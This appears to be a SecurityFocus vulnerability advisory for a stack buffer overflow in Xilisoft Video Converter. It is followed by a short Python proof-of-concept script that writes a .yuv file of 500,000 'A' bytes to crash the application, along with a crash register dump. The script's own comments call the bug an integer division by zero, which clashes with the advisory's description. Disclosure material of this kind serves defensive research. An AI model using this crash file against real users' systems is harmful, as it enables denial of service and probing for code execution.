source: http://www.securityfocus.com/bid/38854/info

Xilisoft Video Converter is prone to a stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

#! /usr/bin/python
#
# Xilisoft Video Converter(.yuv file) Stack buffer Overflow Poc
# Homepage: www.xilisoft.com
# #############################################################################
# Credit : ItSecTeam
# mail : Bug@ItSecTeam.com
# Web:  WwW.ITSecTeam.com
# Forum: WwW.forum.itsecteam.com
# Exploit Coded by: hoshang jafari a.k.a (PLATEN) @ ItSecTeam
# Special Tanks : M3hr@n.S - B3hz4d - Cdef3nder
# #############################################################################
# Bug: Integer Division By Zero
# Tested in : Windows XP SP3 EN
# Tested version : 3   = Crash
# Usage: ./Xilisoft-poc.py
# #############################################################################
# 102DFDAB: Integer divide by zero (exc.code c0000094, tid 2908)
# EAX 00000000  ECX 00000000 EBX 00000001 ESP 000E629C EBP 025B3270
# ESI 00000000 EDI 00000000 EIP 102DFDAB avcodec.102DFDAB
 
try:
        file=open("Xilisoft-poc.yuv",'w')
        Buff = "\x41" *500000
        file.write( Buff )
        file.close()
        print   ("[+] File created successfully: Xilisoft-poc.yuv" )
except:
        print "[-] Error cant write file to system\n"